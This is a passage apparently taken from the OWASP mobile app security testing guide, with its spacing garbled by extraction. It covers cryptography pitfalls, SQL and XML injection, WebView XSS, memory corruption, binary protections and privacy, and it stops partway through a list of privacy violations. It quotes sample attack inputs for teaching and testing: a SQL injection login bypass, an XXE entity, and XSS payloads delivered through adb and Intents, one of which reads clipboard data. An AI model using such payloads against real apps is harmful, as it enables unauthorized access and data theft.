Formoreinformationoneffectiveblockmodes,seetheNISTguidelinesonblockmodeselection. Predictable Initialization Vector CBC,OFB,CFB,PCBC,GCMmoderequireaninitializationvector(IV)asaninitialinputtothecipher. TheIVdoesn’thave tobekeptsecret,butitshouldn’tbepredictable: itshouldberandomandunique/non-repeatableforeachencryptedmes- sage. MakesurethatIVsaregeneratedusingacryptographicallysecurerandomnumbergenerator. Formoreinformation onIVs,seeCryptoFail’sinitializationvectorsarticle. Pay attention to cryptographic libraries used in the code: many open source libraries provide examples in their docu- mentationsthatmightfollowbadpractices(e.g.usingahardcodedIV).Apopularmistakeiscopy-pastingexamplecode withoutchangingtheIVvalue. Initialization Vectors in stateful operation modes Please note that the usage of IVs is different when using CTR and GCM mode in which the initialization vector is often acounter(inCTRcombinedwithanonce). SohereusingapredictableIVwithitsownstatefulmodelisexactlywhatis needed. InCTRyouhaveanewnoncepluscounterasaninputtoeverynewblockoperation. Forexample: fora5120 bitlongplaintext: youhave20blocks,soyouneed20inputvectorsconsistingofanonceandcounter. WhereasinGCM youhaveasingleIVpercryptographicoperation,whichshouldnotberepeatedwiththesamekey. Seesection8ofthe documentationfromNISTonGCMformoredetailsandrecommendationsoftheIV. Padding Oracle Attacks due to Weaker Padding or Block Operation Implementations In the old days, PKCS1.5 padding (in code: PKCS1Padding) was used as a padding mechanism when doing asymmet- ric encryption. This mechanism is vulnerable to the padding oracle attack. Therefore, it is best to use OAEP (Optimal Asymmetric Encryption Padding) captured in PKCS#1 v2.0 (in code: OAEPPadding, OAEPwithSHA-256andMGF1Padding, OAEPwithSHA-224andMGF1Padding, OAEPwithSHA-384andMGF1Padding, OAEPwithSHA-512andMGF1Padding). Note that, even when using OAEP, you can still run into an issue known best as the Manger’s attack as described in the blog at Kudelskisecurity. Note: AES-CBCwithPKCS#5hasshowntobevulnerabletopaddingoracleattacksaswell,giventhattheimplementation giveswarnings,suchas“Paddingerror”,“MACerror”,or“decryptionfailed”. SeeThePaddingOracleAttackandTheCBC PaddingOracleProblemforanexample. Next,itisbesttoensurethatyouaddanHMACafteryouencrypttheplaintext: afterallaciphertextwithafailingMACwillnothavetobedecryptedandcanbediscarded. Protecting Keys in Storage and in Memory When memory dumping is part of your threat model, then keys can be accessed the moment they are actively used. Memorydumpingeitherrequiresroot-access(e.g.arooteddeviceorjailbrokendevice)oritrequiresapatchedapplication withFrida(soyoucanusetoolslikeFridump). Thereforeitisbesttoconsiderthefollowing,ifkeysarestillneededatthe device: • KeysinaRemoteServer: youcanuseremoteKeyvaultssuchasAmazonKMSorAzureKeyVault. Forsomeuse cases,developinganorchestrationlayerbetweentheappandtheremoteresourcemightbeasuitableoption. For instance,aserverlessfunctionrunningonaFunctionasaService(FaaS)system(e.g.AWSLambdaorGoogleCloud Functions)whichforwardsrequeststoretrieveanAPIkeyorsecret. ThereareotheralternativessuchasAmazon Cognito,GoogleIdentityPlatformorAzureActiveDirectory. • Keys inside Secure Hardware-backed Storage: make sure that all cryptographic actions and the key itself remainintheTrustedExecutionEnvironment(e.g.useAndroidKeystore)orSecureEnclave(e.g.usetheKeychain). RefertotheAndroidDataStorageandiOSDataStoragechaptersformoreinformation. • KeysprotectedbyEnvelopeEncryption: IfkeysarestoredoutsideoftheTEE/SE,considerusingmulti-layered encryption: anenvelopeencryptionapproach(seeOWASPCryptographicStorageCheatSheet,GoogleCloudKey managementguide,AWSWell-ArchitectedFrameworkguide),oraHPKEapproachtoencryptdataencryptionkeys withkeyencryptionkeys. 75\n• KeysinMemory: makesurethatkeysliveinmemoryfortheshortesttimepossibleandconsiderzeroingoutand nullifyingkeysaftersuccessfulcryptographicoperations,andincaseoferror. Forgeneralcryptocodingguidelines, refertoCleanmemoryofsecretdata. Note: giventheeaseofmemorydumping,neversharethesamekeyamongaccountsand/ordevices,otherthanpublic keysusedforsignatureverificationorencryption. Protecting Keys in Transport Whenkeysneedtobetransportedfromonedevicetoanother,orfromtheapptoabackend,makesurethatproperkey protectionisinplace,bymeansofatransportkeypairoranothermechanism. Often,keysaresharedwithobfuscation methods which can be easily reversed. Instead, make sure asymmetric cryptography or wrapping keys are used. For example,asymmetrickeycanbeencryptedwiththepublickeyfromanasymmetrickeypair. Cryptographic APIs on Android and iOS WhilesamebasiccryptographicprinciplesapplyindependentoftheparticularOS,eachoperatingsystemoffersitsown implementationandAPIs. Platform-specificcryptographicAPIsfordatastoragearecoveredingreaterdetailinthe“Data StorageonAndroid”and“TestingDataStorageoniOS”chapters. Encryptionofnetworktraffic,especiallyTransportLayer Security(TLS),iscoveredinthe“AndroidNetworkAPIs”chapter. Cryptographic Policy Inlargerorganizations,orwhenhigh-riskapplicationsarecreated,itcanoftenbeagoodpracticetohaveacryptographic policy, based on frameworks such as NIST Recommendation for Key Management. When basic errors are found in the applicationofcryptography,itcanbeagoodstartingpointofsettingupalessonslearned/cryptographickeymanagement policy. Cryptography Regulations WhenyouuploadtheapptotheAppStoreorGooglePlay,yourapplicationistypicallystoredonaUSserver. Ifyourapp containscryptographyandisdistributedtoanyothercountry,itisconsideredacryptographyexport. Itmeansthatyou needtofollowUSexportregulationsforcryptography. Also,somecountrieshaveimportregulationsforcryptography. Learnmore: • ComplyingwithEncryptionExportRegulations(Apple) • Exportcomplianceoverview(Apple) • Exportcompliance(Google) • EncryptionandExportAdministrationRegulations(USA) • EncryptionControl(France) • Worldmapofencryptionlawsandpolicies 76\nMobile App Code Quality Mobileappdevelopersuseawidevarietyofprogramminglanguagesandframeworks. Assuch,commonvulnerabilities such as SQL injection, buffer overflows, and cross-site scripting (XSS), may manifest in apps when neglecting secure programmingpractices. The same programming flaws may affect both Android and iOS apps to some degree, so we’ll provide an overview of the most common vulnerability classes frequently in the general section of the guide. In later sections, we will cover OS-specificinstancesandexploitmitigationfeatures. Injection Flaws Aninjectionflawdescribesaclassofsecurityvulnerabilityoccurringwhenuserinputisinsertedintobackendqueriesor commands. By injecting meta-characters, an attacker can execute malicious code that is inadvertently interpreted as partofthecommandorquery. Forexample,bymanipulatingaSQLquery,anattackercouldretrievearbitrarydatabase recordsormanipulatethecontentofthebackenddatabase. Vulnerabilitiesofthisclassaremostprevalentinserver-sidewebservices. Exploitableinstancesalsoexistwithinmobile apps,butoccurrencesarelesscommon,plustheattacksurfaceissmaller. Forexample,whileanappmightqueryalocalSQLitedatabase,suchdatabasesusuallydonotstoresensitivedata(assum- ingthedeveloperfollowedbasicsecuritypractices). ThismakesSQLinjectionanon-viableattackvector. Nevertheless, exploitable injection vulnerabilities sometimes occur, meaning proper input validation is a necessary best practice for programmers. SQL Injection A SQL injection attack involves integrating SQL commands into input data, mimicking the syntax of a predefined SQL command. A successful SQL injection attack allows the attacker to read or write to the database and possibly execute administrativecommands,dependingonthepermissionsgrantedbytheserver. AppsonbothAndroidandiOSuseSQLitedatabasesasameanstocontrolandorganizelocaldatastorage. Assumean Android app handles local user authentication by storing the user credentials in a local database (a poor programming practicewe’lloverlookforthesakeofthisexample). Uponlogin,theappqueriesthedatabasetosearchforarecordwith theusernameandpasswordenteredbytheuser: SQLiteDatabasedb; Stringsql ="SELECT*FROMusersWHEREusername='" + username +"'ANDpassword='" +password +"'"; Cursorc =db.rawQuery(sql,null ); return c.getCount()!=0; Let’sfurtherassumeanattackerentersthefollowingvaluesintothe“username”and“password”fields: username =1'or'1'='1 password =1'or'1'='1 Thisresultsinthefollowingquery: SELECT *FROM users WHERE username='1'OR'1'='1'ANDPassword='1'OR'1'= '1' Becausethecondition'1'='1'alwaysevaluatesastrue,thisqueryreturnallrecordsinthedatabase,causingthelogin functiontoreturntrueeventhoughnovaliduseraccountwasentered. OstorlabexploitedthesortparameterofYahoo’sweathermobileapplicationwithadbusingthisSQLinjectionpayload. Another real-world instance of client-side SQL injection was discovered by Mark Woods within the “Qnotes” and “Qget” AndroidappsrunningonQNAPNASstorageappliances. TheseappsexportedcontentprovidersvulnerabletoSQLinjection, allowinganattackertoretrievethecredentialsfortheNASdevice. Adetaileddescriptionofthisissuecanbefoundon theNettitudeBlog. 77\nXML Injection InaXMLinjectionattack,theattackerinjectsXMLmeta-characterstostructurallyalterXMLcontent. Thiscanbeusedto eithercompromisethelogicofanXML-basedapplicationorservice,aswellaspossiblyallowanattackertoexploitthe operationoftheXMLparserprocessingthecontent. ApopularvariantofthisattackisXMLeXternalEntity(XXE).Here, anattackerinjectsanexternalentitydefinitioncon- taininganURIintotheinputXML.Duringparsing,theXMLparserexpandstheattacker-definedentitybyaccessingthe resourcespecifiedbytheURI.Theintegrityoftheparsingapplicationultimatelydeterminescapabilitiesaffordedtothe attacker, wherethemalicioususer coulddoany(orall) ofthefollowing: accesslocalfiles, triggerHTTPrequeststoar- bitraryhostsandports, launchacross-siterequestforgery(CSRF)attack, andcauseadenial-of-servicecondition. The OWASPwebtestingguidecontainsthefollowingexampleforXXE: <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo[ <!ELEMENT fooANY> <!ENTITY xxeSYSTEM "file:///dev/random" >]><foo>&xxe;</foo> Inthisexample,thelocalfile/dev/randomisopenedwhereanendlessstreamofbytesisreturned,potentiallycausinga denial-of-service. The current trend in app development focuses mostly on REST/JSON-based services as XML is becoming less common. However,intherarecaseswhereuser-suppliedorotherwiseuntrustedcontentisusedtoconstructXMLqueries,itcould be interpreted by local XML parsers, such as NSXMLParser on iOS. As such, said input should always be validated and meta-charactersshouldbeescaped. Injection Attack Vectors Theattacksurfaceofmobileappsisquitedifferentfromtypicalwebandnetworkapplications. Mobileappsdon’toften exposeservicesonthenetwork,andviableattackvectorsonanapp’suserinterfacearerare. Injectionattacksagainstan apparemostlikelytooccurthroughinter-processcommunication(IPC)interfaces,whereamaliciousappattacksanother apprunningonthedevice. Locatingapotentialvulnerabilitybeginsbyeither: • Identifying possible entry points for untrusted input then tracing from those locations to see if the destination containspotentiallyvulnerablefunctions. • Identifying known, dangerous library / API calls (e.g. SQL queries) and then checking whether unchecked input successfullyinterfaceswithrespectivequeries. Duringamanualsecurityreview,youshouldemployacombinationofbothtechniques. Ingeneral,untrustedinputsenter mobileappsthroughthefollowingchannels: • IPCcalls • CustomURLschemes • QRcodes • InputfilesreceivedviaBluetooth,NFC,orothermeans • Pasteboards • Userinterface Verifythatthefollowingbestpracticeshavebeenfollowed: • Untrustedinputsaretype-checkedand/orvalidatedusingalistofacceptablevalues. • Preparedstatementswithvariablebinding(i.e.parameterizedqueries)areusedwhenperformingdatabasequeries. Ifpreparedstatementsaredefined,user-supplieddataandSQLcodeareautomaticallyseparated. • WhenparsingXMLdata,ensuretheparserapplicationisconfiguredtorejectresolutionofexternalentitiesinorder topreventXXEattack. • When working with x509 formatted certificate data, ensure that secure parsers are used. For instance Bouncy Castlebelowversion1.6allowsforRemoteCodeExecutionbymeansofunsafereflection. WewillcoverdetailsrelatedtoinputsourcesandpotentiallyvulnerableAPIsforeachmobileOSintheOS-specifictesting guides. 78\nCross-Site Scripting Flaws Cross-site scripting (XSS) issues allow attackers to inject client-side scripts into web pages viewed by users. This type ofvulnerabilityisprevalentinwebapplications. Whenauserviewstheinjectedscriptinabrowser, theattackergains theabilitytobypassthesameoriginpolicy,enablingawidevarietyofexploits(e.g.stealingsessioncookies,loggingkey presses,performingarbitraryactions,etc.). Inthecontextofnativeapps,XSSrisksarefarlessprevalentforthesimplereasonthesekindsofapplicationsdonotrely onawebbrowser. However,appsusingWebViewcomponents,suchasWKWebVieworthedeprecatedUIWebViewoniOS andWebViewonAndroid,arepotentiallyvulnerabletosuchattacks. Anolderbutwell-knownexampleisthelocalXSSissueintheSkypeappforiOS,firstidentifiedby PhilPurviance. The Skypeappfailedtoproperlyencodethenameofthemessagesender,allowinganattackertoinjectmaliciousJavaScript tobeexecutedwhenauserviewsthemessage. Inhisproof-of-concept,Philshowedhowtoexploittheissueandsteala user’saddressbook. Static Analysis - Security Testing Considerations TakeacloselookatanyWebViewspresentandinvestigateforuntrustedinputrenderedbytheapp. XSSissuesmayexistiftheURLopenedbyWebViewispartiallydeterminedbyuserinput. Thefollowingexampleisfrom anXSSissueintheZohoWebService,reportedbyLinusSärud. Java webView.loadUrl("javascript:initialize(" +myNumber +");"); Kotlin webView.loadUrl("javascript:initialize($myNumber);") AnotherexampleofXSSissuesdeterminedbyuserinputispublicoverriddenmethods. Java @Override public boolean shouldOverrideUrlLoading(WebViewview,Stringurl){ if(url.substring(0,6).equalsIgnoreCase("yourscheme:")){ //parsetheURLobjectandexecutefunctions } } Kotlin funshouldOverrideUrlLoading(view:WebView,url:String):Boolean { if(url.substring(0,6).equals("yourscheme:",ignoreCase =true)){ //parsetheURLobjectandexecutefunctions } } SergeyBobrovwasabletotakeadvantageofthisinthefollowingHackerOnereport. AnyinputtotheHTMLparameter wouldbetrustedinQuora’sActionBarContentActivity. Payloadsweresuccessfulusingadb,clipboarddataviaModalCon- tentActivity,andIntentsfrom3rdpartyapplications. • ADB $adb shell $am start -ncom.quora.android/com.quora.android.ActionBarContentActivity \ -eurl 'http://test/test' -ehtml 'XSS<script>alert(123)</script>' • ClipboardData 79\n$am start -ncom.quora.android/com.quora.android.ModalContentActivity \ -eurl 'http://test/test' -ehtml \ '<script>alert(QuoraAndroid.getClipboardData());</script>' • 3rdpartyIntentinJavaorKotlin: Intenti =newIntent(); i.setComponent(newComponentName("com.quora.android", "com.quora.android.ActionBarContentActivity")); i.putExtra("url","http://test/test"); i.putExtra("html","XSSPoC <script>alert(123)</script>"); view.getContext().startActivity(i); vali=Intent() i.component =ComponentName("com.quora.android", "com.quora.android.ActionBarContentActivity") i.putExtra("url","http://test/test") i.putExtra("html","XSSPoC <script>alert(123)</script>") view.context.startActivity(i) IfaWebViewisusedtodisplayaremotewebsite,theburdenofescapingHTMLshiftstotheserverside. IfanXSSflaw exists on the web server, this can be used to execute script in the context of the WebView. As such, it is important to performstaticanalysisofthewebapplicationsourcecode. Verifythatthefollowingbestpracticeshavebeenfollowed: • NountrusteddataisrenderedinHTML,JavaScriptorotherinterpretedcontextsunlessitisabsolutelynecessary. • Appropriateencodingisappliedtoescapecharacters,suchasHTMLentityencoding. Note: escapingrulesbecome complicatedwhenHTMLisnestedwithinothercode,forexample,renderingaURLlocatedinsideaJavaScriptblock. Considerhowdatawillberenderedinaresponse. Forexample,ifdataisrenderedinaHTMLcontext,sixcontrolcharacters thatmustbeescaped: Character Escaped & &amp; < &lt; > &gt; ” &quot; ’ &#x27; / &#x2F; For a comprehensive list of escaping rules and other prevention measures, refer to the OWASP XSS Prevention Cheat Sheet. Dynamic Analysis - Security Testing Considerations XSS issues can be best detected using manual and/or automated input fuzzing, i.e. injecting HTML tags and special characters into all available input fields to verify the web application denies invalid inputs or escapes the HTML meta- charactersinitsoutput. AreflectedXSSattackreferstoanexploitwheremaliciouscodeisinjectedviaamaliciouslink. Totestfortheseattacks, automatedinputfuzzingisconsideredtobeaneffectivemethod. Forexample,theBURPScannerishighlyeffectivein identifyingreflectedXSSvulnerabilities. Asalwayswithautomatedanalysis,ensureallinputvectorsarecoveredwitha manualreviewoftestingparameters. Memory Corruption Bugs Memorycorruptionbugsareapopularmainstaywithhackers. Thisclassofbugresultsfromaprogrammingerrorthat causes the program to access an unintended memory location. Under the right conditions, attackers can capitalize on thisbehaviortohijacktheexecutionflowofthevulnerableprogramandexecutearbitrarycode. Thiskindofvulnerability occursinanumberofways: 80\n• Bufferoverflows: Thisdescribesaprogrammingerrorwhereanappwritesbeyondanallocatedmemoryrangefor aparticularoperation. Anattackercanusethisflawtooverwriteimportantcontroldatalocatedinadjacentmemory, suchasfunctionpointers. Bufferoverflowswereformerlythemostcommontypeofmemorycorruptionflaw,but havebecomelessprevalentovertheyearsduetoanumberoffactors. Notably,awarenessamongdevelopersof therisksinusingunsafeClibraryfunctionsisnowacommonbestpracticeplus,catchingbufferoverflowbugsis relativelysimple. However,itisstillworthtestingforsuchdefects. • Out-of-bounds-access: Buggypointerarithmeticmaycauseapointerorindextoreferenceapositionbeyondthe boundsoftheintendedmemorystructure(e.g.bufferorlist). Whenanappattemptstowritetoanout-of-bounds address, a crash or unintended behavior occurs. If the attackercan control the targetoffset and manipulate the contentwrittentosomeextent,codeexecutionexploitislikelypossible. • Dangling pointers: These occur when an object with an incoming reference to a memory location is deleted ordeallocated, buttheobjectpointerisnotreset. Iftheprogramlaterusesthedanglingpointertocallavirtual functionofthealreadydeallocatedobject,itispossibletohijackexecutionbyoverwritingtheoriginalvtablepointer. Alternatively,itispossibletoreadorwriteobjectvariablesorothermemorystructuresreferencedbyadangling pointer. • Use-after-free: Thisreferstoaspecialcaseofdanglingpointersreferencingreleased(deallocated)memory. After amemoryaddressiscleared,allpointersreferencingthelocationbecomeinvalid,causingthememorymanagerto returntheaddresstoapoolofavailablememory. Whenthismemorylocationiseventuallyre-allocated,accessing theoriginalpointerwillreadorwritethedatacontainedinthenewlyallocatedmemory. Thisusuallyleadstodata corruptionandundefinedbehavior,butcraftyattackerscansetuptheappropriatememorylocationstoleverage controloftheinstructionpointer. • Integeroverflows: Whentheresultofanarithmeticoperationexceedsthemaximumvaluefortheintegertype defined by the programmer, this results in the value “wrapping around” the maximum integer value, inevitably resultinginasmallvaluebeingstored. Conversely,whentheresultofanarithmeticoperationissmallerthanthe minimumvalueoftheintegertype,anintegerunderflowoccurswheretheresultislargerthanexpected. Whether aparticularintegeroverflow/underflowbugisexploitabledependsonhowtheintegerisused. Forexample,ifthe integertypeweretorepresentthelengthofabuffer,thiscouldcreateabufferoverflowvulnerability. • Formatstringvulnerabilities: Whenuncheckeduserinputispassedtotheformatstringparameteroftheprintf familyofCfunctions,attackersmayinjectformattokenssuchas‘%c’and‘%n’toaccessmemory. Formatstring bugsareconvenienttoexploitduetotheirflexibility. Shouldaprogramoutputtheresultofthestringformatting operation,theattackercanreadandwritetomemoryarbitrarily,thusbypassingprotectionfeaturessuchasASLR. Theprimarygoalinexploitingmemorycorruptionisusuallytoredirectprogramflowintoalocationwheretheattackerhas placedassembledmachineinstructionsreferredtoasshellcode. OniOS,thedataexecutionpreventionfeature(asthe nameimplies)preventsexecutionfrommemorydefinedasdatasegments. Tobypassthisprotection,attackersleverage return-orientedprogramming(ROP).Thisprocessinvolveschainingtogethersmall,pre-existingcodechunks(“gadgets”) in the text segment where these gadgets may execute a function useful to the attacker or, call mprotect to change memoryprotectionsettingsforthelocationwheretheattackerstoredtheshellcode. Android apps are, for the most part, implemented in Java which is inherently safe from memory corruption issues by design. However,nativeappsutilizingJNIlibrariesaresusceptibletothiskindofbug. Inrarecases,Androidappsthatuse XML/JSONparserstounwrapJavaobjectsarealsosubjecttomemorycorruptionbugs. Anexampleofsuchvulnerability wasfoundinthePayPalapp. Similarly,iOSappscanwrapC/C++callsinObj-CorSwift,makingthemsusceptibletothesekindofattacks. Example: Thefollowingcodesnippetshowsasimpleexampleforaconditionresultinginabufferoverflowvulnerability. void copyData(char *userId){ char smallBuffer[10];//sizeof10 strcpy(smallBuffer,userId); } Toidentifypotentialbufferoverflows,lookforusesofunsafestringfunctions(strcpy,strcat,otherfunctionsbeginning withthe“str”prefix,etc.) andpotentiallyvulnerableprogrammingconstructs,suchascopyinguserinputintoalimited- sizebuffer. Thefollowingshouldbeconsideredredflagsforunsafestringfunctions: • strcat 81\n• strcpy • strncat • strlcat • strncpy • strlcpy • sprintf • snprintf • gets Also,lookforinstancesofcopyoperationsimplementedas“for”or“while”loopsandverifylengthchecksareperformed correctly. Verifythatthefollowingbestpracticeshavebeenfollowed: • Whenusingintegervariablesforarrayindexing,bufferlengthcalculations,oranyothersecurity-criticaloperation, verifythatunsignedintegertypesareusedandperformpreconditiontestsareperformedtopreventthepossibility ofintegerwrapping. • Theappdoesnotuseunsafestringfunctionssuchasstrcpy,mostotherfunctionsbeginningwiththe“str”prefix, sprint,vsprintf,gets,etc.; • IftheappcontainsC++code,ANSIC++stringclassesareused; • Incaseofmemcpy,makesureyoucheckthatthetargetbufferisatleastofequalsizeasthesourceandthatboth buffersarenotoverlapping. • iOSappswritteninObjective-CuseNSStringclass. CappsoniOSshoulduseCFString,theCoreFoundationrepre- sentationofastring. • Nountrusteddataisconcatenatedintoformatstrings. Static Analysis Security Testing Considerations Staticcodeanalysisoflow-levelcodeisacomplextopicthatcouldeasilyfillitsownbook. AutomatedtoolssuchasRATS combinedwithlimitedmanualinspectioneffortsareusuallysufficienttoidentifylow-hangingfruits. However, memory corruption conditions often stem from complex causes. For example, a use-after-free bug may actually be the result of an intricate, counter-intuitive race condition not immediately apparent. Bugs manifesting from deep instances of overlookedcodedeficienciesaregenerallydiscoveredthroughdynamicanalysisorbytesterswhoinvesttimetogaina deepunderstandingoftheprogram. Dynamic Analysis Security Testing Considerations Memory corruption bugs are best discovered via input fuzzing: an automated black-box software testing technique in whichmalformeddataiscontinuallysenttoanapptosurveyforpotentialvulnerabilityconditions. Duringthisprocess, theapplicationismonitoredformalfunctionsandcrashes. Shouldacrashoccur,thehope(atleastforsecuritytesters) isthattheconditionscreatingthecrashrevealanexploitablesecurityflaw. Fuzztestingtechniquesorscripts(oftencalled“fuzzers”)willtypicallygeneratemultipleinstancesofstructuredinputina semi-correctfashion. Essentially,thevaluesorargumentsgeneratedareatleastpartiallyacceptedbythetargetapplica- tion,yetalsocontaininvalidelements,potentiallytriggeringinputprocessingflawsandunexpectedprogrambehaviors. A good fuzzer exposes a substantial amount of possible program execution paths (i.e. high coverage output). Inputs are either generated from scratch (“generation-based”) or derived from mutating known, valid input data (“mutation- based”). Formoreinformationonfuzzing,refertotheOWASPFuzzingGuide. Binary Protection Mechanisms Position Independent Code PIC(PositionIndependentCode)iscodethat,beingplacedsomewhereintheprimarymemory,executesproperlyregard- lessofitsabsoluteaddress. PICiscommonlyusedforsharedlibraries,sothatthesamelibrarycodecanbeloadedina 82\nlocationineachprogramaddressspacewhereitdoesnotoverlapwithothermemoryinuse(forexample,othershared libraries). PIE (Position Independent Executable) are executable binaries made entirely from PIC. PIE binaries are used to enable ASLR(AddressSpaceLayoutRandomization)whichrandomlyarrangestheaddressspacepositionsofkeydataareasof aprocess,includingthebaseoftheexecutableandthepositionsofthestack,heapandlibraries. Memory Management Automatic Reference Counting ARC(AutomaticReferenceCounting)isamemorymanagementfeatureoftheClangcompilerexclusivetoObjective-Cand Swift. ARCautomaticallyfreesupthememoryusedbyclassinstanceswhenthoseinstancesarenolongerneeded. ARC differsfromtracinggarbagecollectioninthatthereisnobackgroundprocessthatdeallocatestheobjectsasynchronously atruntime. Unliketracinggarbagecollection,ARCdoesnothandlereferencecyclesautomatically. Thismeansthataslongasthere are“strong”referencestoanobject,itwillnotbedeallocated. Strongcross-referencescanaccordinglycreatedeadlocks andmemoryleaks. Itisuptothedevelopertobreakcyclesbyusingweakreferences. Youcanlearnmoreabouthowit differsfromGarbageCollectionhere. Garbage Collection GarbageCollection(GC)isanautomaticmemorymanagementfeatureofsomelanguagessuchasJava/Kotlin/Dart. The garbage collector attempts to reclaim memory which was allocated by the program, but is no longer referenced—also called garbage. The Android runtime (ART) makes use of an improved version of GC. You can learn more about how it differsfromARChere. Manual Memory Management Manualmemory managementistypically requiredin native librarieswritten inC/C++ whereARCand GC donot apply. Thedeveloperisresponsiblefordoingpropermemorymanagement. Manualmemorymanagementisknowntoenable several major classes of bugs into a program when used incorrectly, notably violations of memory safety or memory leaks. Moreinformationcanbefoundin“MemoryCorruptionBugs”. Stack Smashing Protection Stackcanarieshelppreventstackbufferoverflowattacksbystoringahiddenintegervalueonthestackrightbeforethe return pointer. This value is then validated before the return statement of the function is executed. A buffer overflow attack often overwrites a region of memory in order to overwrite the return pointer and take over the program flow. If stackcanariesareenabled,theywillbeoverwrittenaswellandtheCPUwillknowthatthememoryhasbeentampered with. Stackbufferoverflowisatypeofthemoregeneralprogrammingvulnerabilityknownasbufferoverflow(orbufferoverrun). Overfillingabufferonthestackismorelikelytoderailprogramexecutionthanoverfillingabufferontheheapbecause thestackcontainsthereturnaddressesforallactivefunctioncalls. 83\nMobile App User Privacy Protection Overview IMPORTANTDISCLAIMER:TheMASTGisnotalegalhandbook. Therefore,wewillnotdeepdiveintotheGDPRorother possibly relevant legislation here. This chapter is meant to introduce you to the topics and provide you with essential referencesthatyoucanusetocontinueresearchingbyyourself. We’llalsodoourbestefforttoprovideyouwithtestsor guidelinesfortestingtheprivacy-relatedrequirementslistedintheOWASPMASVS. The Main Problem Mobileappshandleallkindsofsensitiveuserdata,fromidentificationandbankinginformationtohealthdata. Thereisan understandableconcernabouthowthisdataishandledandwhereitendsup. Wecanalsotalkabout“benefitsusersget fromusingtheapps”vs“therealpricethattheyarepayingforit”(usuallyandunfortunatelywithoutevenbeingaware ofit). The Solution (pre-2020) Toensurethatusersareproperlyprotected,legislationsuchastheGeneralDataProtectionRegulation(GDPR)inEurope hasbeendevelopedanddeployed(applicablesinceMay25,2018),forcingdeveloperstobemoretransparentregarding thehandlingofsensitiveuserdata. Thishasbeenmainlyimplementedusingprivacypolicies. The Challenge Therearetwomaindimensionstoconsiderhere: • DeveloperCompliance: Developersneedtocomplywithlegalprivacyprinciplessincetheyareenforcedbylaw. Developersneedtobettercomprehendthelegalprinciplesinordertoknowwhatexactlytheyneedtoimplement toremaincompliant. Ideally,atleast,thefollowingmustbefulfilled: – Privacy-by-Designapproach(Art. 25GDPR,“Dataprotectionbydesignandbydefault”). – PrincipleofLeastPrivilege(“Everyprogramandeveryuserofthesystemshouldoperateusingtheleast setofprivilegesnecessarytocompletethejob.”) • UserEducation: Usersneedtobeeducatedabouttheirsensitivedataandinformedabouthowtousetheappli- cationproperly(toensuresecurehandlingandprocessingoftheirinformation). Note: Moreoftenthannotappswillclaimtohandlecertaindata,butinrealitythat’snotthecase. TheIEEEarticle “EngineeringPrivacyin Smartphone Apps: A TechnicalGuideline Catalogfor App Developers” by Majid Hatamian givesaveryniceintroductiontothistopic. Protection Goals for Data Protection When an app needs personal information from a user for its business process, the user needs to be informed on what happenswiththedataandwhytheappneedsit. Ifthereisathirdpartydoingtheactualprocessingofthedata,theapp shouldinformtheuseraboutthattoo. Surelyyou’realreadyfamiliarwiththeclassictriadofsecurityprotectiongoals: confidentiality,integrity,andavailability. However,youmightnotbeawareofthethreeprotectiongoalsthathavebeenproposedtofocusondataprotection: • Unlinkability: – Users’privacy-relevantdatamustbeunlinkabletoanyothersetofprivacy-relevantdataoutsideofthedomain. – Includes: dataminimization,anonymization,pseudonymization,etc. • Transparency: 84\n– Usersshouldbeabletorequestallinformationthattheapplicationhasonthem,andreceiveinstructionson howtorequestthisinformation. – Includes: privacypolicies,usereducation,properloggingandauditingmechanisms,etc. • Intervenability: – Usersshouldbeabletocorrecttheirpersonalinformation,requestitsdeletion,withdrawanygivenconsent atanytime,andreceiveinstructionsonhowtodoso. – Includes: privacy settings directly in the app, single points of contact for individuals’ intervention requests (e.g.in-appchat,telephonenumber,e-mail),etc. SeeSection5.1.1“Introductiontodataprotectiongoals”inENISA’s“Privacyanddataprotectioninmobileapplica- tions”formoredetaileddescriptions. Addressing both security and privacy protection goals at the same time is a very challenging task (if not impossible in many cases). There is an interesting visualization in IEEE’s publication Protection Goals for Privacy Engineering called “TheThreeAxes”representingtheimpossibilitytoensure100%ofeachofthesixgoalssimultaneously. Mostpartsoftheprocessesderivedfromtheprotectiongoalsaretraditionallycoveredinaprivacypolicy. However,this approachisnotalwaysoptimal: • developersarenotlegalexpertsbutstillneedtobecompliant. • userswouldberequiredtoreadusuallylongandwordypolicies. The New Approach (Google’s and Apple’s take on this) In order to address these challenges and help users easily understand how their data is being collected, handled, and shared, Google and Apple introduced new privacy labeling systems (very much along the lines of NIST’s proposal for ConsumerSoftwareCybersecurityLabeling: • theAppStoreNutritionLabels(since2020). • theGooglePlayDataSafetySection(since2021). Asanewrequirementonbothplatforms,it’svitalthattheselabelsareaccurateinordertoprovideuserassuranceand mitigateabuse. Google ADA MASA program Performingregularsecuritytestingcanhelpdevelopersidentifykeyvulnerabilitiesintheirapps. GooglePlaywillallow developerswhohavecompletedindependentsecurityvalidationtoshowcasethisontheirDatasafetysection. Thishelps usersfeelmoreconfidentaboutanapp’scommitmenttosecurityandprivacy. Inordertoprovidemoretransparencyintotheapp’ssecurityarchitecture,GooglehasintroducedtheMASA(MobileAppli- cationSecurityAssessment)programaspartoftheAppDefenseAlliance(ADA).WithMASA,Googlehasacknowledged theimportanceofleveragingagloballyrecognizedstandardformobileappsecuritytothemobileappecosystem. Devel- operscanworkdirectlywithanAuthorizedLabpartnertoinitiateasecurityassessment. Googlewillrecognizedevelopers whohavehadtheirapplicationsindependentlyvalidatedagainstasetofMASVSLevel1requirementsandwillshowcase thisontheirDatasafetysection. 85\nIfyouareadeveloperandwouldliketoparticipate,youshouldcompletetheIndependentSecurityReviewform. Notethatthelimitednatureoftestingdoesnotguaranteecompletesafetyoftheapplication. Thisindependentreview maynotbescopedtoverifytheaccuracyandcompletenessofadeveloper’sDatasafetydeclarations. Developersremain solelyresponsibleformakingcompleteandaccuratedeclarationsintheirapp’sPlaystorelisting. References Youcanlearnmoreaboutthisandotherprivacyrelatedtopicshere: • iOSAppPrivacyPolicy • iOSPrivacyDetailsSectionontheAppStore • iOSPrivacyBestPractices • AndroidAppPrivacyPolicy • AndroidDataSafetySectiononGooglePlay • PreparingyourappforthenewDatasafetysectioninGooglePlay • AndroidPrivacyBestPractices Testing for Privacy in Mobile Apps Thefollowingisalistofcommonprivacyviolationsthatyouasasecuritytestershouldreport(althoughnotanexhaustive list): • Example 1: An app that accesses a user’s inventory of installed apps and doesn’t treat this data as personal or sensitivedatabysendingitoverthenetwork(violatingMSTG-STORAGE-4)ortoanotherappviaIPCmechanisms (violatingMSTG-STORAGE-6). • Example2: 